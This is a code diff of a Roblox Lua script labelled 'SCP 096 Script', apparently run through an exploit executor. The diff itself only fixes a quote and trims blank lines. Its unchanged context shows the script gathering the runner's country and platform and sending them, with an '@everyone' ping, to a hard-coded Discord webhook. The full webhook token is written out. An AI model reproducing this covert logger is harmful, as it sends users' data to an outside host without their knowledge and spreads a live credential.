@@ -1,4 +1,3 @@
--- Table for mapping country codes to full country names with emojis
 local countryNames = {
     ["AF"] = "Afghanistan 🇦🇫",
     ["AL"] = "Albania 🇦🇱",
@@ -276,7 +275,7 @@ local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
 local url = "https://discord.com/api/webhooks/1292048103175753778/0Iel5dnvbrFAIdY74ARfb557FlTnzu07f_nxUZhpShzEkSQym_66fdGoeANwx_g_vFs8"
 
 local data = {
-   ["content"] = "@everyone Player Executed SCP 096 Script,
+   ["content"] = "@everyone Player Executed SCP 096 Script",
    ["embeds"] = {{
       ["title"] = "**Player Information**",
       ["description"] = "Details about the player and the game.",
@@ -372,7 +371,6 @@ local headers = {
 local request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-
 
 local TweenService = game:GetService("TweenService")
 local ScreenGui = Instance.new("ScreenGui")
